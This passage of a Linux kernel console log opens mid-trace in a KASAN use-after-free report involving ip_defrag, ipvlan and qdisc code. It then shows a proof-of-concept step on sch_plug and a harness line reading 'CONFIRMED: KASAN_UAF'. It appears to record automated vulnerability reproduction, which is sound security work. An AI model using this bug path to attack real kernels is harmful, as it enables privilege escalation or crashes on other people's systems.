[    2.837942]  do_syscall_64+0x3b/0x90
[    2.838490]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    2.839258] 
[    2.839499] Freed by task 19:
[    2.839952]  kasan_save_stack+0x33/0x60
[    2.840508]  kasan_set_track+0x25/0x30
[    2.840998]  kasan_save_free_info+0x2b/0x50
[    2.841548]  __kasan_slab_free+0x10a/0x180
[    2.842067]  __kmem_cache_free+0x82/0x1c0
[    2.842549]  __sk_destruct+0x3ab/0x540
[    2.843046]  ip_defrag+0x117/0x2350
[    2.843510]  ipv4_conntrack_defrag+0x1ad/0x2e0
[    2.844093]  nf_hook_slow+0xa2/0x170
[    2.844662]  __ip_local_out+0x351/0x4f0
[    2.845344]  ip_local_out+0x18/0xc0
[    2.845931]  ipvlan_queue_xmit+0x127b/0x1690
[    2.846618]  ipvlan_start_xmit+0x42/0xd0
[    2.847323]  dev_hard_start_xmit+0xc5/0x490
[    2.847948]  sch_direct_xmit+0x129/0xa50
[    2.848625]  __qdisc_run+0x3c5/0x1780
[    2.849136]  net_tx_action+0x410/0x6b0
[    2.849669]  __do_softirq+0x1bf/0x5b5
[    2.850260] 
[    2.850514] The buggy address belongs to the object at ffff88800a0c3000
[    2.850514]  which belongs to the cache kmalloc-2k of size 2048
[    2.852270] The buggy address is located 18 bytes inside of
[    2.852270]  freed 2048-byte region [ffff88800a0c3000, ffff88800a0c3800)
[    2.853944] 
[    2.854216] The buggy address belongs to the physical page:
[    2.855136] page:00000000f5f5a5d4 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa0c0
[    2.856318] head:00000000f5f5a5d4 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    2.857485] flags: 0x100000000010200(slab|head|node=0|zone=1)
[    2.858212] page_type: 0xffffffff()
[    2.858748] raw: 0100000000010200 ffff888006442000 dead000000000122 0000000000000000
[    2.859797] raw: 0000000000000000 0000000080080008 00000001ffffffff 0000000000000000
[    2.860846] page dumped because: kasan: bad access detected
[    2.861634] 
[    2.861829] Memory state around the buggy address:
[    2.862437]  ffff88800a0c2f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.863343]  ffff88800a0c2f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.864252] >ffff88800a0c3000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.865203]                          ^
[    2.865673]  ffff88800a0c3080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.866700]  ffff88800a0c3100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.867689] ==================================================================
[poc] sch_plug_action(idx=5,handle=0x10000,action=RELEASE_INDEFINITE,limit=0): OK
[    2.870540] Disabling lock debugging due to kernel taint
[    3.217004] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    3.799567] poc (61) used greatest stack depth: 25488 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    5.175169] ACPI: PM: Preparing to enter system sleep state S5
[    5.176387] reboot: Power down
CONFIRMED: KASAN_UAF
